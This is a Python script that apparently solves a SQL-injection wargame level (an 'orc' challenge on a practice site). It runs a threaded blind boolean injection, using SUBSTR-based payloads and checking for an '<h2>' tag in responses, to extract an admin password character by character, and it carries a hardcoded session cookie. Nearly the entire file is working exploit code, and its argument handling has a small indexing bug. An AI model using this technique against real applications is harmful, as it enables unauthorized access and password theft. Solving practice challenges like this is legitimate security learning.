#!/bin/python3
import sys
import threading
import time
import requests
import itertools as it

st = time.time()
if len(sys.argv) == 2:
    url = sys.argv[1]
    php_cookie = sys.argv[2]
else:
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
    php_cookie = "4668b19caq36q449evot9t505i"

result = [' '] * 8


def is_correct(pw):
    r = requests.get(url,
                     params={"pw": pw},
                     cookies={"PHPSESSID": php_cookie})
    return "<h2>" in r.content.decode("UTF-8")


def compute_char(pos):
    for letter in it.chain(range(ord('0'), ord('9') + 1), range(ord('a'), ord('z') + 1)):
        if is_correct("' or id = 'admin' and SUBSTR(pw, {}, 1) = '{}".format(pos, chr(letter))):
            result[pos-1] = chr(letter)
            return 0


threads = [None] * 8

for position in range(1, 9):
    threads[position-1] = threading.Thread(target=compute_char, args=(position,))
    threads[position-1].start()

for thread in threads:
    thread.join()
print(result)
print("time to finish: ", time.time() - st)